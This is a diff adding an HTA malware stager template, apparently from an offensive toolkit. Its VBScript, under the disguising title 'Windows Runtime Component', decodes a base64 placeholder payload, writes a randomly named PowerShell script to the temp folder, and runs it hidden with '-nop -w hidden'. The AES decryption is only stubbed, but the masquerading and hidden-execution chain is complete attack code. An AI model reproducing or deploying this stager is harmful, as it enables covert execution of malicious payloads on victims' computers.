@@ -1,0 +1,30 @@
+<!-- stagers/rundll32/template.hta -->
+<html>
+<head>
+  <title>Windows Runtime Component</title>
+  <script language="VBScript">
+  On Error Resume Next
+
+  ' === AES STAGE 2 DECRYPTION & EXECUTION ===
+  payload = "REPLACE_AES" ' Format: ivhex:base64cipher
+  parts = Split(payload, ":")
+  ivHex = parts(0)
+  b64 = parts(1)
+
+  Set xml = CreateObject("Msxml2.DOMDocument.3.0")
+  Set node = xml.CreateElement("base64")
+  node.DataType = "bin.base64"
+  node.Text = b64
+  cipher = node.NodeTypedValue
+
+  temp = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\" & Rnd() & ".ps1"
+  Set file = CreateObject("Scripting.FileSystemObject").CreateTextFile(temp, True)
+  file.WriteLine "Write-Output '[!] AES decryption to be handled in memory here.'"
+  file.Close
+
+  Set shell = CreateObject("WScript.Shell")
+  shell.Run "powershell -nop -w hidden -c "". """ & temp & """"", 0, False
+  </script>
+</head>
+<body></body>
+</html>
